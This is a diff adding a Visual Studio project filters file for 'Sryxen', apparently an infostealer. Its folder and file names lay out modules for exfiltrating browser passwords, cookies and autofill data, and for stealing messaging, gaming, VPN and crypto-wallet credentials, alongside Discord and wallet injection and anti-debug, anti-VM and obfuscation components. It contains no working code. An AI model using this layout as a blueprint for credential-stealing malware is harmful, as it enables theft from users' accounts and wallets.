@@ -1,0 +1,560 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup>
+    <Filter Include="Source Files">
+      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
+      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
+    </Filter>
+    <Filter Include="Header Files">
+      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
+      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
+    </Filter>
+    <Filter Include="Resource Files">
+      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
+      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
+    </Filter>
+    <Filter Include="Header Files\Cryptography">
+      <UniqueIdentifier>{aac9d174-a85a-4b89-9a90-b046313d7117}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Parsers">
+      <UniqueIdentifier>{b58f5477-ee60-498a-855f-3a18b19854dc}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Networking">
+      <UniqueIdentifier>{5dca35ef-3951-4b6c-805a-f900da3192ea}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\IO">
+      <UniqueIdentifier>{c1f62454-647d-4d84-a182-3f182214dc45}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\WinApi-Syscalls">
+      <UniqueIdentifier>{1f1da430-b503-40b0-852a-c514222895c7}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\String-Obfuscation">
+      <UniqueIdentifier>{35dfa90e-092c-4ba4-b626-e56fe49a2b4b}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\WinApi-Syscalls\PEB">
+      <UniqueIdentifier>{3f6c1bcb-a74d-432b-b58e-8b995ef113a8}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Browsers">
+      <UniqueIdentifier>{aea48830-55c0-4d44-ba94-406a2340e6db}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Browsers\Browser-Cryptography">
+      <UniqueIdentifier>{55b38042-969c-4804-8bb8-1e4479f52cbf}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Include">
+      <UniqueIdentifier>{47a92275-1c03-48bb-8cab-c00f7a854dc4}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Messaging-Apps">
+      <UniqueIdentifier>{43300a8c-9769-4e27-9cc1-9eed7ffa0d80}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Messaging-Apps\Discord">
+      <UniqueIdentifier>{9d92babd-c12f-4151-b290-124cd3fda640}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\WinApi-Syscalls\Memory-Protection">
+      <UniqueIdentifier>{31162c3b-0c8d-4326-8144-ccc92b7c0e48}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\WinApi-Syscalls\VEH">
+      <UniqueIdentifier>{c0e1be10-e17c-4497-84e6-7fc4c806b0ad}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Browsers\Browser-Exfiltration">
+      <UniqueIdentifier>{e6982727-fe73-4918-93ec-57f453432326}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Browsers\Browser-Filepaths">
+      <UniqueIdentifier>{21a58875-4cb9-476a-b8ff-7f64cb613f44}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Browsers\Browser-Exfiltration\Bookmarks-Exfil">
+      <UniqueIdentifier>{df355bd8-4846-4fd8-9f8d-9ae67392b82d}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Browsers\Browser-Exfiltration\Passwords-Exfil">
+      <UniqueIdentifier>{57759e51-e904-41fb-8f26-b342c0243b68}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Browsers\Browser-Exfiltration\History-Exfil">
+      <UniqueIdentifier>{1ad38d13-1ea7-4f6b-a862-5569214e38e7}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Browsers\Browser-Exfiltration\Autofill-Exfil">
+      <UniqueIdentifier>{04862420-a3fc-4442-88d5-efc555bbbc3f}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Messaging-Apps\Skype">
+      <UniqueIdentifier>{79b27b74-d267-47e4-812a-af824de1f5ef}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Messaging-Apps\Pidgin">
+      <UniqueIdentifier>{33ed96bc-1e27-4846-b073-8a868e29ab93}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Messaging-Apps\Qtox">
+      <UniqueIdentifier>{1f9f7686-f925-4b19-9e03-f414c3af5992}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Messaging-Apps\Telegram">
+      <UniqueIdentifier>{e4687aeb-c0fd-4735-af6c-c739211d4717}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Messaging-Apps\Element">
+      <UniqueIdentifier>{50c7a1b2-10e7-4511-b949-b3b28f14062a}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Messaging-Apps\ICQ">
+      <UniqueIdentifier>{7f315b00-ed57-4073-b13b-6faeed9f6d4f}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Messaging-Apps\Signal">
+      <UniqueIdentifier>{b7305313-e9a5-4b0b-94c1-7e19d4f1cbec}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Messaging-Apps\Viber">
+      <UniqueIdentifier>{77eb66da-e5dc-420f-b49f-8a27a29efd8e}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Games">
+      <UniqueIdentifier>{70efaf04-0db2-41ff-80bd-3d8201bfc24d}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Games\Minecraft">
+      <UniqueIdentifier>{1332c38f-2d1a-4b6d-86c1-8b5d03cdd67e}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Games\EpicGames">
+      <UniqueIdentifier>{31b501d8-e2f2-4893-a3fc-0a2030c86f27}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Games\Ubisoft">
+      <UniqueIdentifier>{cf21e985-5e4a-43b4-b59b-caf40c534a78}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Games\EA">
+      <UniqueIdentifier>{26bd6c8b-6e05-4eb4-a60b-9c03f43766a3}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Games\Growtopia">
+      <UniqueIdentifier>{f1824451-3640-4998-b8bc-493ea5dea96d}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Games\BattleNet">
+      <UniqueIdentifier>{cbaf6e92-d4d2-4aa2-b5e8-e7be8b8a715d}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Games\Steam">
+      <UniqueIdentifier>{a6a68985-dfd4-44e4-8813-9ad6ace48ca4}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\VPN">
+      <UniqueIdentifier>{c5c90d77-af1b-4bbc-acef-a5c93db96d09}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\VPN\Surfshark">
+      <UniqueIdentifier>{f3bd5092-fd2a-4c95-99c8-86b989e4dad1}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\VPN\OpenVPN">
+      <UniqueIdentifier>{a529264b-33b4-4875-955e-fb7a80ff3c1d}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\VPN\Proton">
+      <UniqueIdentifier>{de33da24-57bf-4881-a5eb-79c648ee983d}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Cryptocurrency">
+      <UniqueIdentifier>{10ff2a0c-6494-4734-9a8f-eb335d0471dc}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\WinApi-Syscalls\IAT_Hide">
+      <UniqueIdentifier>{95179b0e-2ed2-4e2e-b848-0da0b185e049}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\SQLITE3">
+      <UniqueIdentifier>{18d64519-938c-4b50-8c6f-7773c048514d}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\WinApi-Syscalls\Break_IDA">
+      <UniqueIdentifier>{7eb2a308-9f6c-4512-867e-dfd31e93c9e8}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Macro-JunkInstructions">
+      <UniqueIdentifier>{72378282-5ffa-448c-b2e3-85245fc35b4c}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Anti-VM">
+      <UniqueIdentifier>{a37819d4-4919-4107-a97e-d9e8bd1123ce}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Anti-VM\Anti-Triage">
+      <UniqueIdentifier>{1f974ebd-cd4e-4692-9287-f923b1e58da1}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Anti-Debug">
+      <UniqueIdentifier>{b5cd429d-ebc9-4ab4-af69-3d163287b218}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Anti-Debug\BeingDebugged">
+      <UniqueIdentifier>{4af9235b-94bb-4909-89cb-a4d002fff961}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Anti-Debug\IsDebuggerPresent">
+      <UniqueIdentifier>{53d5f36a-74d6-489b-82eb-19053870eaf0}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Anti-Debug\NtGlobalFlag">
+      <UniqueIdentifier>{a391b288-7c20-423c-a33f-4c0d9403284a}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Anti-Debug\SharedUserData-KernelDebugger">
+      <UniqueIdentifier>{fc1c7395-0674-4ee2-a9b7-3a0c171c7d3d}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Anti-Debug\UnhandledExceptionFilter-Handler">
+      <UniqueIdentifier>{72ec4816-315d-4269-a577-f88a199a8a41}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Anti-Debug\Interrupt_3">
+      <UniqueIdentifier>{f80312d4-4340-4b23-b708-013d7cf955f7}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Anti-Dissasembler">
+      <UniqueIdentifier>{d2223d29-d5ae-4202-bccc-0bbf71ca4635}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\MEM-Dump">
+      <UniqueIdentifier>{baa2ffc3-753f-4b30-96e9-df63900f3256}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\MEM-Dump\Steam">
+      <UniqueIdentifier>{aef0b340-e588-4b40-981f-dff243273c4d}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Browsers\AppBoundEncryption">
+      <UniqueIdentifier>{ba76dbe0-9826-431a-adbd-9522ae06b9cf}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Browsers\AppBoundEncryption\Chrome-Edge">
+      <UniqueIdentifier>{901c7f49-b619-4718-9352-5f8d3b9761f2}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Browsers\AppBoundEncryption\Chrome-Edge-Headers">
+      <UniqueIdentifier>{fd60bd10-0a32-4f63-a83c-0c94787aa250}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Browsers\AppBoundEncryption\Debugging">
+      <UniqueIdentifier>{b99488a7-7aa5-4cae-9e53-04df7a175578}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Injections">
+      <UniqueIdentifier>{7baf00d1-a2cd-475f-b928-cd65effc3076}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files\Browsers\Browser-Exfiltration\Cookies-Exfil">
+      <UniqueIdentifier>{a760db6f-7fec-4f12-9a13-95d929cbc58b}</UniqueIdentifier>
+    </Filter>
+  </ItemGroup>
+  <ItemGroup>
+    <ClCompile Include="Sryxen.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="base64.cpp">
+      <Filter>Header Files\Cryptography</Filter>
+    </ClCompile>
+    <ClCompile Include="nss3.cpp">
+      <Filter>Header Files\Networking</Filter>
+    </ClCompile>
+    <ClCompile Include="asn1.cpp">
+      <Filter>Header Files\Parsers</Filter>
+    </ClCompile>
+    <ClCompile Include="winapi_structs.cpp">
+      <Filter>Header Files\WinApi-Syscalls</Filter>
+    </ClCompile>
+    <ClCompile Include="os.cpp">
+      <Filter>Header Files\IO</Filter>
+    </ClCompile>
+    <ClCompile Include="Gecko.cpp">
+      <Filter>Header Files\Browsers</Filter>
+    </ClCompile>
+    <ClCompile Include="Crypto.cpp">
+      <Filter>Header Files\Browsers\Browser-Cryptography</Filter>
+    </ClCompile>
+    <ClCompile Include="Discord.cpp">
+      <Filter>Header Files\Messaging-Apps\Discord</Filter>
+    </ClCompile>
+    <ClCompile Include="Bookmarks.cpp">
+      <Filter>Header Files\Browsers\Browser-Exfiltration\Bookmarks-Exfil</Filter>
+    </ClCompile>
+    <ClCompile Include="Passwords.cpp">
+      <Filter>Header Files\Browsers\Browser-Exfiltration\Passwords-Exfil</Filter>
+    </ClCompile>
+    <ClCompile Include="History.cpp">
+      <Filter>Header Files\Browsers\Browser-Exfiltration\History-Exfil</Filter>
+    </ClCompile>
+    <ClCompile Include="Autofill.cpp">
+      <Filter>Header Files\Browsers\Browser-Exfiltration\Autofill-Exfil</Filter>
+    </ClCompile>
+    <ClCompile Include="Cookies.cpp">
+      <Filter>Header Files\Browsers\Browser-Exfiltration\Cookies-Exfil</Filter>
+    </ClCompile>
+    <ClCompile Include="EntryPoint_Socials.hpp">
+      <Filter>Header Files\Messaging-Apps</Filter>
+    </ClCompile>
+    <ClCompile Include="Anti_Triage.cpp">
+      <Filter>Header Files\Anti-VM\Anti-Triage</Filter>
+    </ClCompile>
+    <ClCompile Include="BeingDebugged.cpp">
+      <Filter>Header Files\Anti-Debug\BeingDebugged</Filter>
+    </ClCompile>
+    <ClCompile Include="IsDebuggerPresent.cpp">
+      <Filter>Header Files\Anti-Debug\IsDebuggerPresent</Filter>
+    </ClCompile>
+    <ClCompile Include="NtGlobalFlag.cpp">
+      <Filter>Header Files\Anti-Debug\NtGlobalFlag</Filter>
+    </ClCompile>
+    <ClCompile Include="SharedUserData_KernelDebugger.cpp">
+      <Filter>Header Files\Anti-Debug\SharedUserData-KernelDebugger</Filter>
+    </ClCompile>
+    <ClCompile Include="UnhandledExceptionFilter_Handler.cpp">
+      <Filter>Header Files\Anti-Debug\UnhandledExceptionFilter-Handler</Filter>
+    </ClCompile>
+    <ClCompile Include="Interrupt_3.cpp">
+      <Filter>Header Files\Anti-Debug\Interrupt_3</Filter>
+    </ClCompile>
+    <ClCompile Include="Anti_Dissasembler.cpp">
+      <Filter>Header Files\Anti-Dissasembler</Filter>
+    </ClCompile>
+    <ClCompile Include="Steam_Memory_Dumping.cpp">
+      <Filter>Header Files\MEM-Dump\Steam</Filter>
+    </ClCompile>
+    <ClCompile Include="EntryPoint_AppBoundEncryption.hpp">
+      <Filter>Header Files\Browsers\AppBoundEncryption</Filter>
+    </ClCompile>
+    <ClCompile Include="Memory.cpp">
+      <Filter>Header Files\Browsers\AppBoundEncryption\Chrome-Edge</Filter>
+    </ClCompile>
+    <ClCompile Include="Process.cpp">
+      <Filter>Header Files\Browsers\AppBoundEncryption\Chrome-Edge</Filter>
+    </ClCompile>
+    <ClCompile Include="Tokens.cpp">
+      <Filter>Header Files\Browsers\AppBoundEncryption\Chrome-Edge</Filter>
+    </ClCompile>
+    <ClCompile Include="Version.cpp">
+      <Filter>Header Files\Browsers\AppBoundEncryption\Chrome-Edge</Filter>
+    </ClCompile>
+    <ClCompile Include="Helper.cpp">
+      <Filter>Header Files\Browsers\AppBoundEncryption\Chrome-Edge</Filter>
+    </ClCompile>
+    <ClCompile Include="Entry_Decrypt.cpp">
+      <Filter>Header Files\Browsers\AppBoundEncryption\Chrome-Edge</Filter>
+    </ClCompile>
+    <ClCompile Include="core.cpp">
+      <Filter>Header Files\Browsers\AppBoundEncryption\Debugging</Filter>
+    </ClCompile>
+    <ClCompile Include="Atomic.hpp">
+      <Filter>Header Files\Injections</Filter>
+    </ClCompile>
+    <ClCompile Include="Get.cpp">
+      <Filter>Header Files\Networking</Filter>
+    </ClCompile>
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="base64.hpp">
+      <Filter>Header Files\Cryptography</Filter>
+    </ClInclude>
+    <ClInclude Include="json.hpp">
+      <Filter>Header Files\Parsers</Filter>
+    </ClInclude>
+    <ClInclude Include="nss3.hpp">
+      <Filter>Header Files\Networking</Filter>
+    </ClInclude>
+    <ClInclude Include="asn1.hpp">
+      <Filter>Header Files\Parsers</Filter>
+    </ClInclude>
+    <ClInclude Include="os.hpp">
+      <Filter>Header Files\IO</Filter>
+    </ClInclude>
+    <ClInclude Include="peb.h">
+      <Filter>Header Files\WinApi-Syscalls\PEB</Filter>
+    </ClInclude>
+    <ClInclude Include="wmipp.hpp">
+      <Filter>Header Files\IO</Filter>
+    </ClInclude>
+    <ClInclude Include="Deduplicator.hpp">
+      <Filter>Header Files\Parsers</Filter>
+    </ClInclude>
+    <ClInclude Include="Glob.hpp">
+      <Filter>Header Files\IO</Filter>
+    </ClInclude>
+    <ClInclude Include="Gecko.hpp">
+      <Filter>Header Files\Browsers</Filter>
+    </ClInclude>
+    <ClInclude Include="Crypto.hpp">
+      <Filter>Header Files\Browsers\Browser-Cryptography</Filter>
+    </ClInclude>
+    <ClInclude Include="Discord.hpp">
+      <Filter>Header Files\Messaging-Apps\Discord</Filter>
+    </ClInclude>
+    <ClInclude Include="Segment_Encryption.h">
+      <Filter>Header Files\WinApi-Syscalls\Memory-Protection</Filter>
+    </ClInclude>
+    <ClInclude Include="Vectored_Exception_Handling.hpp">
+      <Filter>Header Files\WinApi-Syscalls\VEH</Filter>
+    </ClInclude>
+    <ClInclude Include="Browsers_EntryPoint.hpp">
+      <Filter>Header Files\Browsers</Filter>
+    </ClInclude>
+    <ClInclude Include="Bookmarks.hpp">
+      <Filter>Header Files\Browsers\Browser-Exfiltration\Bookmarks-Exfil</Filter>
+    </ClInclude>
+    <ClInclude Include="Passwords.hpp">
+      <Filter>Header Files\Browsers\Browser-Exfiltration\Passwords-Exfil</Filter>
+    </ClInclude>
+    <ClInclude Include="History.hpp">
+      <Filter>Header Files\Browsers\Browser-Exfiltration\History-Exfil</Filter>
+    </ClInclude>
+    <ClInclude Include="Autofill.hpp">
+      <Filter>Header Files\Browsers\Browser-Exfiltration\Autofill-Exfil</Filter>
+    </ClInclude>
+    <ClInclude Include="Cookies.hpp">
+      <Filter>Header Files\Browsers\Browser-Exfiltration\Cookies-Exfil</Filter>
+    </ClInclude>
+    <ClInclude Include="Element.hpp">
+      <Filter>Header Files\Messaging-Apps\Element</Filter>
+    </ClInclude>
+    <ClInclude Include="ICQ.hpp">
+      <Filter>Header Files\Messaging-Apps\ICQ</Filter>
+    </ClInclude>
+    <ClInclude Include="Viber.hpp">
+      <Filter>Header Files\Messaging-Apps\Viber</Filter>
+    </ClInclude>
+    <ClInclude Include="Signal.hpp">
+      <Filter>Header Files\Messaging-Apps\Signal</Filter>
+    </ClInclude>
+    <ClInclude Include="Telegram.hpp">
+      <Filter>Header Files\Messaging-Apps\Telegram</Filter>
+    </ClInclude>
+    <ClInclude Include="QTox.hpp">
+      <Filter>Header Files\Messaging-Apps\Qtox</Filter>
+    </ClInclude>
+    <ClInclude Include="Pidgin.hpp">
+      <Filter>Header Files\Messaging-Apps\Pidgin</Filter>
+    </ClInclude>
+    <ClInclude Include="Skype.hpp">
+      <Filter>Header Files\Messaging-Apps\Skype</Filter>
+    </ClInclude>
+    <ClInclude Include="Minecraft.hpp">
+      <Filter>Header Files\Games\Minecraft</Filter>
+    </ClInclude>
+    <ClInclude Include="EpicGames.hpp">
+      <Filter>Header Files\Games\EpicGames</Filter>
+    </ClInclude>
+    <ClInclude Include="Ubisoft.hpp">
+      <Filter>Header Files\Games\Ubisoft</Filter>
+    </ClInclude>
+    <ClInclude Include="ElectronicArts.hpp">
+      <Filter>Header Files\Games\EA</Filter>
+    </ClInclude>
+    <ClInclude Include="Growtopia.hpp">
+      <Filter>Header Files\Games\Growtopia</Filter>
+    </ClInclude>
+    <ClInclude Include="BattleNet.hpp">
+      <Filter>Header Files\Games\BattleNet</Filter>
+    </ClInclude>
+    <ClInclude Include="EntryPoint_Games.hpp">
+      <Filter>Header Files\Games</Filter>
+    </ClInclude>
+    <ClInclude Include="Steam.hpp">
+      <Filter>Header Files\Games\Steam</Filter>
+    </ClInclude>
+    <ClInclude Include="Proton.hpp">
+      <Filter>Header Files\VPN\Proton</Filter>
+    </ClInclude>
+    <ClInclude Include="OpenVPN.hpp">
+      <Filter>Header Files\VPN\OpenVPN</Filter>
+    </ClInclude>
+    <ClInclude Include="Surfshark.hpp">
+      <Filter>Header Files\VPN\Surfshark</Filter>
+    </ClInclude>
+    <ClInclude Include="EntryPoint_VPN.hpp">
+      <Filter>Header Files\VPN</Filter>
+    </ClInclude>
+    <ClInclude Include="IAT_Hide.h">
+      <Filter>Header Files\WinApi-Syscalls\IAT_Hide</Filter>
+    </ClInclude>
+    <ClInclude Include="winapi_structs.hpp">
+      <Filter>Header Files\WinApi-Syscalls</Filter>
+    </ClInclude>
+    <ClInclude Include="obfusheader.h">
+      <Filter>Header Files\String-Obfuscation</Filter>
+    </ClInclude>
+    <ClInclude Include="Crypto-Exfil.hpp">
+      <Filter>Header Files\Cryptocurrency</Filter>
+    </ClInclude>
+    <ClInclude Include="sqlite3.h">
+      <Filter>Header Files\SQLITE3</Filter>
+    </ClInclude>
+    <ClInclude Include="sqlite3-vcpkg-config.h">
+      <Filter>Header Files\SQLITE3</Filter>
+    </ClInclude>
+    <ClInclude Include="sqlite3ext.h">
+      <Filter>Header Files\SQLITE3</Filter>
+    </ClInclude>
+    <ClInclude Include="Break_IDA_x64.hpp">
+      <Filter>Header Files\WinApi-Syscalls\Break_IDA</Filter>
+    </ClInclude>
+    <ClInclude Include="Junk_Instructions.h">
+      <Filter>Header Files\Macro-JunkInstructions</Filter>
+    </ClInclude>
+    <ClInclude Include="EntryPoint_AntiVM.hpp">
+      <Filter>Header Files\Anti-VM</Filter>
+    </ClInclude>
+    <ClInclude Include="Anti_Triage.h">
+      <Filter>Header Files\Anti-VM\Anti-Triage</Filter>
+    </ClInclude>
+    <ClInclude Include="EntryPoint_AntiDebug.hpp">
+      <Filter>Header Files\Anti-Debug</Filter>
+    </ClInclude>
+    <ClInclude Include="BeingDebugged.h">
+      <Filter>Header Files\Anti-Debug\BeingDebugged</Filter>
+    </ClInclude>
+    <ClInclude Include="IsDebuggerPresent.h">
+      <Filter>Header Files\Anti-Debug\IsDebuggerPresent</Filter>
+    </ClInclude>
+    <ClInclude Include="NtGlobalFlag.h">
+      <Filter>Header Files\Anti-Debug\NtGlobalFlag</Filter>
+    </ClInclude>
+    <ClInclude Include="SharedUserData_KernelDebugger.h">
+      <Filter>Header Files\Anti-Debug\SharedUserData-KernelDebugger</Filter>
+    </ClInclude>
+    <ClInclude Include="UnhandledExceptionFilter_Handler.h">
+      <Filter>Header Files\Anti-Debug\UnhandledExceptionFilter-Handler</Filter>
+    </ClInclude>
+    <ClInclude Include="Interrupt_3.h">
+      <Filter>Header Files\Anti-Debug\Interrupt_3</Filter>
+    </ClInclude>
+    <ClInclude Include="Anti_Dissasembler.h">
+      <Filter>Header Files\Anti-Dissasembler</Filter>
+    </ClInclude>
+    <ClInclude Include="EntryPoint_MemoryDumping.hpp">
+      <Filter>Header Files\MEM-Dump</Filter>
+    </ClInclude>
+    <ClInclude Include="Steam_Memory_Dumping.h">
+      <Filter>Header Files\MEM-Dump\Steam</Filter>
+    </ClInclude>
+    <ClInclude Include="Version.h">
+      <Filter>Header Files\Browsers\AppBoundEncryption\Chrome-Edge-Headers</Filter>
+    </ClInclude>
+    <ClInclude Include="Tokens.h">
+      <Filter>Header Files\Browsers\AppBoundEncryption\Chrome-Edge-Headers</Filter>
+    </ClInclude>
+    <ClInclude Include="Process.h">
+      <Filter>Header Files\Browsers\AppBoundEncryption\Chrome-Edge-Headers</Filter>
+    </ClInclude>
+    <ClInclude Include="PEB-Struct-Browsers.h">
+      <Filter>Header Files\Browsers\AppBoundEncryption\Chrome-Edge-Headers</Filter>
+    </ClInclude>
+    <ClInclude Include="Pattern.h">
+      <Filter>Header Files\Browsers\AppBoundEncryption\Chrome-Edge-Headers</Filter>
+    </ClInclude>
+    <ClInclude Include="Memory.h">
+      <Filter>Header Files\Browsers\AppBoundEncryption\Chrome-Edge-Headers</Filter>
+    </ClInclude>
+    <ClInclude Include="Helper.h">
+      <Filter>Header Files\Browsers\AppBoundEncryption\Chrome-Edge-Headers</Filter>
+    </ClInclude>
+    <ClInclude Include="Entry.h">
+      <Filter>Header Files\Browsers\AppBoundEncryption\Chrome-Edge-Headers</Filter>
+    </ClInclude>
+    <ClInclude Include="Sryxen.hpp">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="Models.hpp">
+      <Filter>Header Files\Browsers\Browser-Filepaths</Filter>
+    </ClInclude>
+    <ClInclude Include="Paths.hpp">
+      <Filter>Header Files\Browsers\Browser-Filepaths</Filter>
+    </ClInclude>
+    <ClInclude Include="SteamDumper.hpp">
+      <Filter>Header Files\Games\Steam</Filter>
+    </ClInclude>
+    <ClInclude Include="core.hpp">
+      <Filter>Header Files\Browsers\AppBoundEncryption\Debugging</Filter>
+    </ClInclude>
+    <ClInclude Include="asar.hpp">
+      <Filter>Header Files\Parsers</Filter>
+    </ClInclude>
+    <ClInclude Include="Get.hpp">
+      <Filter>Header Files\Networking</Filter>
+    </ClInclude>
+    <ClInclude Include="Exodus.hpp">
+      <Filter>Header Files\Injections</Filter>
+    </ClInclude>
+    <ClInclude Include="Mullvad.hpp">
+      <Filter>Header Files\Injections</Filter>
+    </ClInclude>
+    <ClInclude Include="DiscordInj.hpp">
+      <Filter>Header Files\Injections</Filter>
+    </ClInclude>
+    <ClInclude Include="Injection.hpp">
+      <Filter>Header Files\Injections</Filter>
+    </ClInclude>
+  </ItemGroup>
+  <ItemGroup>
+    <MASM Include="veh-stub.asm">
+      <Filter>Header Files\WinApi-Syscalls\VEH</Filter>
+    </MASM>
+    <MASM Include="AntiDisassm_x64.asm">
+      <Filter>Header Files\Anti-Dissasembler</Filter>
+    </MASM>
+  </ItemGroup>
+</Project>
